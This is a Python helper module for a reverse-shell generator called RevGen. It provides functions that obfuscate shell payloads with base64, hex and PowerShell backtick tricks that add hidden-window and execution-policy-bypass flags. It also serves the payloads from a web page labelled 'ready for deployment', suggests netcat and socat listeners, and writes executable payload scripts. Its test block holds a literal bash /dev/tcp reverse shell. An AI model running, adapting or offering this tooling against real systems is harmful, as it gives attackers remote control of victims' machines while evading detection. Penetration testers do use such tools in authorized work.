#!/usr/bin/env python3
"""
Helper Functions for RevGen
Utilities for IP validation, clipboard operations, obfuscation, and more
"""

import base64
import ipaddress
import socket
import subprocess
import sys
import threading
import time
import webbrowser
from http.server import HTTPServer, SimpleHTTPRequestHandler
from typing import Optional, Dict, List, Tuple
import tempfile
import os
import urllib.parse


def validate_ip_address(address: str) -> Tuple[bool, str]:
    """
    Validate IP address or hostname and return type.
    Returns: (is_valid, address_type)
    """
    # First, check for valid IP address
    try:
        addr = ipaddress.ip_address(address)
        if isinstance(addr, ipaddress.IPv4Address):
            return True, "IPv4"
        else:
            return True, "IPv6"
    except ValueError:
        # If not an IP, check if it's a resolvable hostname
        try:
            socket.gethostbyname(address)
            return True, "Hostname"
        except socket.gaierror:
            return False, "Invalid"


def validate_port(port: int) -> bool:
    """Validate port number"""
    return isinstance(port, int) and 1 <= port <= 65535


def get_local_ip() -> str:
    """Get local IP address (best guess)"""
    try:
        # Connect to a remote address to determine local IP
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"


def get_public_ip() -> Optional[str]:
    """Attempt to get public IP address"""
    services = [
        "https://ifconfig.me/ip",
        "https://ipinfo.io/ip",
        "https://icanhazip.com",
        "https://ident.me"
    ]
    
    for service in services:
        try:
            import urllib.request
            with urllib.request.urlopen(service, timeout=5) as response:
                ip = response.read().decode().strip()
                if validate_ip_address(ip)[0]:
                    return ip
        except Exception:
            continue
    
    return None


def obfuscate_payload(payload: str, method: str = "base64") -> str:
    """
    Obfuscate payload using various methods
    """
    if method == "base64":
        encoded = base64.b64encode(payload.encode()).decode()
        
        # Determine the appropriate decoder based on payload type
        if payload.startswith("python"):
            return f"python -c 'import base64; exec(base64.b64decode(\"{encoded}\").decode())'"
        elif payload.startswith("php"):
            return f"php -r 'eval(base64_decode(\"{encoded}\"));'"
        elif payload.startswith("powershell"):
            return f"powershell -EncodedCommand {encoded}"
        elif payload.startswith(("bash", "sh")):
            return f"echo {encoded} | base64 -d | bash"
        else:
            # Generic base64 wrapper
            return f"echo {encoded} | base64 -d | sh"
    
    elif method == "powershell_encoded":
        # PowerShell-specific UTF-16 base64 encoding
        if payload.startswith("powershell"):
            # Extract the command part after "powershell "
            if " -Command " in payload:
                command_part = payload.split(" -Command ", 1)[1].strip('"')
            else:
                command_part = payload
            
            # Encode to UTF-16LE then base64
            utf16_bytes = command_part.encode('utf-16le')
            encoded = base64.b64encode(utf16_bytes).decode()
            return f"powershell -EncodedCommand {encoded}"
        else:
            return obfuscate_payload(payload, "base64")
    
    elif method == "advanced":
        # Advanced PowerShell obfuscation
        if payload.startswith("powershell"):
            # Multiple layers of obfuscation
            obfuscated = _advanced_powershell_obfuscation(payload)
            return obfuscated
        else:
            return obfuscate_payload(payload, "base64")
    
    elif method == "hex":
        hex_encoded = payload.encode().hex()
        return f"echo {hex_encoded} | xxd -r -p | sh"
    
    elif method == "url":
        return urllib.parse.quote(payload)
    
    else:
        raise ValueError(f"Unknown obfuscation method: {method}")


def _advanced_powershell_obfuscation(payload: str) -> str:
    """Advanced PowerShell obfuscation with multiple techniques"""
    if " -Command " in payload:
        command_part = payload.split(" -Command ", 1)[1].strip('"')
    else:
        command_part = payload
    
    # Layer 1: String splitting and concatenation
    obfuscated = command_part.replace("New-Object", "N`ew-Ob`ject")
    obfuscated = obfuscated.replace("System.Net.Sockets", "Sys`tem.N`et.Sock`ets")
    obfuscated = obfuscated.replace("TCPClient", "TCP`Client")
    
    # Layer 2: Variable substitution
    obfuscated = obfuscated.replace("$client", "${c`l`i`e`n`t}")
    obfuscated = obfuscated.replace("$stream", "${s`t`r`e`a`m}")
    obfuscated = obfuscated.replace("$bytes", "${b`y`t`e`s}")
    
    # Layer 3: Random case and backticks
    import random
    words = ["while", "try", "catch", "GetStream", "Read", "Write", "Flush"]
    for word in words:
        if word in obfuscated:
            # Add random backticks
            new_word = ""
            for i, char in enumerate(word):
                if i > 0 and random.choice([True, False]):
                    new_word += "`"
                new_word += char
            obfuscated = obfuscated.replace(word, new_word)
    
    # Layer 4: Base64 encode the result
    utf16_bytes = obfuscated.encode('utf-16le')
    encoded = base64.b64encode(utf16_bytes).decode()
    
    return f"powershell -W Hidden -Exec Bypass -EncodedCommand {encoded}"


def copy_to_clipboard(text: str) -> bool:
    """Copy text to system clipboard"""
    try:
        # Try different clipboard methods
        if sys.platform == "darwin":  # macOS
            subprocess.run(["pbcopy"], input=text.encode(), check=True)
        elif sys.platform == "linux":  # Linux
            # Try xclip first, then xsel
            try:
                subprocess.run(["xclip", "-selection", "clipboard"], 
                             input=text.encode(), check=True)
            except FileNotFoundError:
                subprocess.run(["xsel", "--clipboard", "--input"], 
                             input=text.encode(), check=True)
        elif sys.platform == "win32":  # Windows
            subprocess.run(["clip"], input=text.encode(), check=True)
        else:
            return False
        
        return True
    except (subprocess.CalledProcessError, FileNotFoundError):
        return False


def format_payload_for_web(payload: str, shell_type: str, ip: str, port: int) -> str:
    """Format payload for web display"""
    return f"""
    <div class="payload-item">
        <h3>{shell_type.title()} Reverse Shell</h3>
        <div class="payload-code">
            <code>{payload}</code>
        </div>
        <div class="payload-info">
            <span>Target: {ip}:{port}</span>
            <button onclick="copyToClipboard('{payload}')">Copy</button>
        </div>
    </div>
    """


class PayloadWebServer:
    """Simple web server to host generated payloads"""
    
    def __init__(self, host: str = "0.0.0.0", port: int = 8080):
        self.host = host
        self.port = port
        self.payloads = {}
        self.server = None
        self.server_thread = None
    
    def add_payloads(self, payloads: Dict[str, Tuple[str, Dict]]):
        """Add payloads to serve"""
        self.payloads = payloads
    
    def generate_html(self) -> str:
        """Generate HTML page with payloads"""
        html_content = """
<!DOCTYPE html>
<html>
<head>
    <title>RevGen - Reverse Shell Payloads</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', 'Arial', sans-serif;
            background: #000000;
            color: #ffffff;
            line-height: 1.6;
            min-height: 100vh;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 40px 20px;
        }
        
        .header {
            text-align: center;
            margin-bottom: 50px;
            padding-bottom: 30px;
            border-bottom: 1px solid #333;
        }
        
        .header h1 {
            color: #ffffff;
            font-size: 2.8rem;
            font-weight: 300;
            margin-bottom: 10px;
            letter-spacing: 2px;
        }
        
        .header p {
            color: #cccccc;
            font-size: 1.1rem;
            font-weight: 300;
        }
        
        .warning {
            background: #dc2626;
            color: #ffffff;
            padding: 15px 20px;
            border-radius: 8px;
            margin-bottom: 40px;
            text-align: center;
            font-weight: 500;
            letter-spacing: 1px;
        }
        
        .payloads {
            display: grid;
            gap: 30px;
        }
        
        .payload-item {
            background: #111111;
            border: 1px solid #333333;
            border-radius: 8px;
            padding: 25px;
            transition: border-color 0.3s ease;
        }
        
        .payload-item:hover {
            border-color: #555555;
        }
        
        .payload-item h3 {
            color: #ffffff;
            font-size: 1.3rem;
            font-weight: 500;
            margin-bottom: 15px;
            letter-spacing: 1px;
        }
        
        .payload-code {
            background: #000000;
            border: 1px solid #333333;
            border-radius: 6px;
            padding: 20px;
            margin: 15px 0;
            overflow-x: auto;
        }
        
        .payload-code code {
            color: #ffffff;
            font-family: 'Consolas', 'Monaco', monospace;
            font-size: 14px;
            line-height: 1.5;
            word-break: break-all;
            white-space: pre-wrap;
        }
        
        .payload-info {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px;
            margin-top: 20px;
        }
        
        .payload-description {
            color: #cccccc;
            font-size: 0.95rem;
            flex: 1;
        }
        
        .copy-button {
            background: #dc2626;
            color: #ffffff;
            border: none;
            padding: 12px 24px;
            border-radius: 6px;
            cursor: pointer;
            font-weight: 500;
            font-size: 14px;
            letter-spacing: 0.5px;
            transition: all 0.3s ease;
            min-width: 130px;
        }
        
        .copy-button:hover {
            background: #b91c1c;
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(220, 38, 38, 0.3);
        }
        
        .copy-button:active {
            transform: translateY(0);
        }
        
        .footer {
            text-align: center;
            margin-top: 60px;
            padding-top: 30px;
            border-top: 1px solid #333;
            color: #888888;
        }
        
        .footer p {
            margin-bottom: 10px;
            font-size: 0.9rem;
        }
        
        /* Mobile responsiveness */
        @media (max-width: 768px) {
            .container {
                padding: 20px 15px;
            }
            
            .header h1 {
                font-size: 2.2rem;
            }
            
            .payload-item {
                padding: 20px;
            }
            
            .payload-info {
                flex-direction: column;
                align-items: stretch;
            }
            
            .copy-button {
                width: 100%;
            }
        }
        
        /* Success animation */
        @keyframes success {
            0% { background: #dc2626; }
            50% { background: #16a34a; }
            100% { background: #dc2626; }
        }
        
        .copy-success {
            animation: success 0.6s ease;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🧞‍♂️ RevGen Payloads</h1>
            <p>Generated reverse shell payloads ready for deployment</p>
        </div>
        
        <div class="warning">
            ⚠️ FOR AUTHORIZED TESTING ONLY ⚠️
        </div>
        
        <div class="payloads">
"""
        
        payload_id = 0
        for shell_type, (payload, info) in self.payloads.items():
            if "error" not in info:
                payload_id += 1
                # HTML escape the payload for display
                import html
                display_payload = html.escape(payload)
                
                html_content += f"""
            <div class="payload-item">
                <h3>{info.get('name', shell_type)} Reverse Shell</h3>
                <div class="payload-code">
                    <code>{display_payload}</code>
                </div>
                <div class="payload-info">
                    <div class="payload-description">{info.get('description', 'Reverse shell payload')}</div>
                    <button class="copy-button" onclick="copyPayload({payload_id})">Copy Payload</button>
                </div>
                <script type="text/javascript">
                    window.payloads = window.payloads || {{}};
                    window.payloads[{payload_id}] = {repr(payload)};
                </script>
            </div>
"""
        
        html_content += """
        </div>
        
        <div class="footer">
            <p>Generated by RevGen - The Reverse Shell Genie</p>
            <p>Remember: With great power comes great responsibility</p>
        </div>
    </div>
    
    <script>
        // Initialize payloads object
        window.payloads = window.payloads || {};
        
        function copyPayload(payloadId) {
            const text = window.payloads[payloadId];
            const buttonElement = event.target;
            
            if (!text) {
                console.error('Payload not found for ID:', payloadId);
                buttonElement.textContent = 'Error';
                setTimeout(() => {
                    buttonElement.textContent = 'Copy Payload';
                }, 2000);
                return;
            }
            
            // Try modern clipboard API first
            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(text).then(function() {
                    showCopySuccess(buttonElement);
                }, function(err) {
                    console.error('Clipboard API failed:', err);
                    fallbackCopy(text, buttonElement);
                });
            } else {
                // Use fallback method
                fallbackCopy(text, buttonElement);
            }
        }
        
        function fallbackCopy(text, buttonElement) {
            // Create a temporary textarea element
            const textArea = document.createElement("textarea");
            textArea.value = text;
            
            // Make it invisible and add to DOM
            textArea.style.position = 'fixed';
            textArea.style.left = '-999999px';
            textArea.style.top = '-999999px';
            textArea.style.opacity = '0';
            textArea.setAttribute('readonly', '');
            
            document.body.appendChild(textArea);
            
            try {
                // Select and copy
                textArea.select();
                textArea.setSelectionRange(0, 99999); // For mobile devices
                
                const successful = document.execCommand('copy');
                if (successful) {
                    showCopySuccess(buttonElement);
                } else {
                    throw new Error('execCommand failed');
                }
            } catch (err) {
                console.error('Fallback copy failed:', err);
                buttonElement.textContent = 'Copy Failed';
                setTimeout(() => {
                    buttonElement.textContent = 'Copy Payload';
                }, 2000);
            } finally {
                document.body.removeChild(textArea);
            }
        }
        
        function showCopySuccess(buttonElement) {
            const originalText = buttonElement.textContent;
            buttonElement.textContent = 'Copied!';
            buttonElement.classList.add('copy-success');
            
            setTimeout(() => {
                buttonElement.textContent = originalText;
                buttonElement.classList.remove('copy-success');
            }, 1500);
        }
        
        // Add smooth scrolling
        document.documentElement.style.scrollBehavior = 'smooth';
        
        // Debug function to check payloads
        function debugPayloads() {
            console.log('Available payloads:', window.payloads);
        }
    </script>
</body>
</html>
"""
        return html_content
    
    def start_server(self) -> bool:
        """Start the web server"""
        try:
            class PayloadHandler(SimpleHTTPRequestHandler):
                def __init__(self, *args, **kwargs):
                    self.payload_server = kwargs.pop('payload_server')
                    super().__init__(*args, **kwargs)
                
                def do_GET(self):
                    if self.path == '/' or self.path == '/index.html':
                        self.send_response(200)
                        self.send_header('Content-type', 'text/html')
                        self.end_headers()
                        html = self.payload_server.generate_html()
                        self.wfile.write(html.encode())
                    else:
                        self.send_error(404)
                
                def log_message(self, format, *args):
                    # Suppress default logging
                    pass
            
            def handler(*args, **kwargs):
                return PayloadHandler(*args, payload_server=self, **kwargs)
            
            self.server = HTTPServer((self.host, self.port), handler)
            
            def run_server():
                self.server.serve_forever()
            
            self.server_thread = threading.Thread(target=run_server)
            self.server_thread.daemon = True
            self.server_thread.start()
            
            return True
        except Exception:
            return False
    
    def stop_server(self):
        """Stop the web server"""
        if self.server:
            self.server.shutdown()
            self.server = None
        if self.server_thread:
            self.server_thread.join(timeout=1)
            self.server_thread = None
    
    def get_url(self) -> str:
        """Get server URL"""
        return f"http://{self.host}:{self.port}"


def check_listener_status(ip: str, port: int, timeout: float = 2.0) -> bool:
    """Check if a listener is running on the specified IP and port"""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            return result == 0
    except Exception:
        return False


def suggest_listener_command(port: int) -> List[str]:
    """Suggest listener commands for the given port"""
    commands = [
        f"nc -lvnp {port}",
        f"ncat -lvnp {port}",
        f"socat TCP-LISTEN:{port},fork,reuseaddr -",
        f"python3 -c \"import socket; s=socket.socket(); s.bind(('0.0.0.0',{port})); s.listen(1); print('Listening on port {port}...'); c,a=s.accept(); print(f'Connection from {{a}}')\"",
    ]
    return commands


def generate_qr_code(text: str, filename: str = None) -> Optional[str]:
    """Generate QR code for payload (requires qrcode library)"""
    try:
        import qrcode
        
        qr = qrcode.QRCode(version=1, box_size=10, border=5)
        qr.add_data(text)
        qr.make(fit=True)
        
        if filename:
            img = qr.make_image(fill_color="black", back_color="white")
            img.save(filename)
            return filename
        else:
            # Return ASCII QR code
            qr.print_ascii()
            return "ASCII QR code printed to terminal"
    except ImportError:
        return None


def create_payload_script(payload: str, shell_type: str, filename: str = None) -> str:
    """Create a standalone script file with the payload"""
    if not filename:
        temp_dir = tempfile.gettempdir()
        filename = os.path.join(temp_dir, f"revgen_{shell_type}_{int(time.time())}.sh")
    
    script_content = f"""#!/bin/bash
# RevGen Reverse Shell Payload
# Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}
# Type: {shell_type}
# WARNING: For authorized testing only!

{payload}
"""
    
    with open(filename, 'w') as f:
        f.write(script_content)
    
    # Make executable
    os.chmod(filename, 0o755)
    
    return filename


if __name__ == "__main__":
    # Test functions
    print("Testing helper functions...")
    
    # Test IP validation
    test_ips = ["192.168.1.1", "2001:db8::1", "invalid_ip", "127.0.0.1"]
    for ip in test_ips:
        valid, ip_type = validate_ip_address(ip)
        print(f"IP {ip}: Valid={valid}, Type={ip_type}")
    
    # Test obfuscation
    test_payload = "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"
    print(f"\nOriginal: {test_payload}")
    print(f"Base64: {obfuscate_payload(test_payload, 'base64')}")
    
    # Test local IP detection
    print(f"\nLocal IP: {get_local_ip()}")
    
    print("\nHelper functions test complete!")
